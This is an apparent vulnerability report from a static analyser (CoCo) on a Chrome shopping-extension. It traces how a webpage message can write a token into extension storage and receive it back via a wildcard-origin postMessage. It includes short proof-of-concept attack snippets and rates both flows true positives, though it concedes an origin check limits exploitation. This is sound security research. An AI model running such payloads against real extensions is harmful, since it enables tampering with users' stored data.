# CoCo Analysis: dngapfkpakcoggijjkjhlikhjgmcpdec

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: storage_local_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dngapfkpakcoggijjkjhlikhjgmcpdec/opgen_generated_files/cs_0.js
Line 418	    var storage_local_get_source = {
        'key': 'value'
    };
Line 495					"yes_token": e.yes_token,
	e.yes_token

**Code:**

```javascript
// Content script (cs_0.js) - Complete exploitation chain

// Step 1: Attacker sends token via postMessage
window.addEventListener("message", function(e) {
    if('https://www.yeslogistics.com.my' == e.origin && undefined != e.data.vuex_token) {
        // Step 2: Forward to background script
        chrome.runtime.sendMessage({vuex_token: e.data.vuex_token}, function(response) { // ← attacker-controlled
        });
    }
}, false);

// Background script (bg.js, line 966-975)
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if('https://www.yeslogistics.com.my' == sender.origin && undefined != request.vuex_token) {
        // Step 3: Store attacker-controlled token
        chrome.storage.local.set({yes_token: request.vuex_token}, function() { // ← storage sink
            console.log('保存成功！');
        });
    }
    sendResponse();
});

// Content script (cs_0.js, line 490-495)
// Step 4: Read and send back to webpage
let token_interval = setInterval(()=>{
    chrome.storage.local.get(['yes_token'], function(e) {
        window.postMessage( // ← postMessage sink - data leaks back to attacker
            {
                "yes_token": e.yes_token, // ← attacker retrieves poisoned data
                "yes_i18n": {
                    "submitting": chrome.i18n.getMessage("submitting"),
                    "goodsAddedCart": chrome.i18n.getMessage("goodsAddedCart"),
                    "loginTips": chrome.i18n.getMessage("loginTips"),
                    // ...
                }
            },
            "*"
        );
    });
}, 3000);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from webpage → chrome.runtime.sendMessage → storage.set → storage.get → window.postMessage back to attacker

**Attack:**

```javascript
// On page https://www.yeslogistics.com.my/* (or any page where content script runs)
// Attacker injects malicious token
window.postMessage({
    vuex_token: "attacker_controlled_token_payload"
}, "*");

// Wait for interval to fire (every 3 seconds)
window.addEventListener("message", function(event) {
    if (event.data.yes_token) {
        console.log("Retrieved poisoned token:", event.data.yes_token);
        // Attacker successfully retrieves the poisoned data
    }
});
```

**Impact:** Complete storage exploitation chain - attacker can inject arbitrary data into extension storage and retrieve it back. While the origin check limits direct exploitation to `https://www.yeslogistics.com.my`, the methodology states to ignore manifest.json restrictions. If an attacker controls this domain or can inject scripts on it (XSS), they can poison the extension's storage and retrieve the data. The extension also posts messages with wildcard origin ("*"), potentially leaking data to any frame on the page.

---

## Sink 2: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dngapfkpakcoggijjkjhlikhjgmcpdec/opgen_generated_files/cs_0.js
Line 478	window.addEventListener("message", function(e)
Line 480		if( 'https://www.yeslogistics.com.my' == e.origin && undefined != e.data.vuex_token) {
Line 480		if( 'https://www.yeslogistics.com.my' == e.origin && undefined != e.data.vuex_token) {

**Code:**

```javascript
// Same flow as Sink 1 - this is the write path of the exploitation chain
window.addEventListener("message", function(e) { // ← attacker entry point
    if('https://www.yeslogistics.com.my' == e.origin && undefined != e.data.vuex_token) {
        chrome.runtime.sendMessage({vuex_token: e.data.vuex_token}, function(response) { // ← attacker-controlled data
        });
    }
}, false);

// Background stores the data
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if('https://www.yeslogistics.com.my' == sender.origin && undefined != request.vuex_token) {
        chrome.storage.local.set({yes_token: request.vuex_token}, function() { // ← storage sink
            console.log('保存成功！');
        });
    }
    sendResponse();
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Same as Sink 1 - this represents the storage write portion of the complete exploitation chain

**Attack:**

```javascript
// Same attack as Sink 1
window.postMessage({
    vuex_token: "malicious_payload"
}, "*");
```

**Impact:** Storage poisoning component of the complete exploitation chain described in Sink 1. Attacker can inject arbitrary tokens into extension storage, which are then leaked back via the window.postMessage mechanism.
